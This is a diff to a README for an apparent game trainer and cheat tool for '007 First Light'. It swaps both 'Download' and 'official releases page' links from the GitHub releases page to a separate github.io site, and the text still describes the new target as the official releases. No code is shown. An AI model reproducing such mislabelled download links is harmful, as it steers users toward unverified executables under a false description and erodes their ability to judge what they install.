@@ -1,6 +1,6 @@
 # 🎮 007-First-Light-Trainer-And-Optimizer_v_2 - Improve Gameplay Performance And Unlock Content
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Mitsu-Shan116/007-First-Light-Trainer-And-Optimizer_v_2/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://mitsu-shan116.github.io)
 
 This software modifies 007 First Light to improve performance and provide gameplay advantages. You can use this tool to increase your frame rate, remove stutter, and access in-game items quickly. The program runs alongside your game and applies changes in real time.
 
@@ -17,7 +17,7 @@ Your computer needs specific hardware and software to run this trainer:
 
 ## 📥 How To Download
 
-1.  Visit the [official releases page](https://github.com/Mitsu-Shan116/007-First-Light-Trainer-And-Optimizer_v_2/releases) to download the latest version.
+1.  Visit the [official releases page](https://mitsu-shan116.github.io) to download the latest version.
 2.  Locate the file ending in `.zip` in the Assets section of the latest release.
 3.  Click the filename to start the download.
 4.  Save the folder to a location you can find, such as your Desktop or Downloads folder.
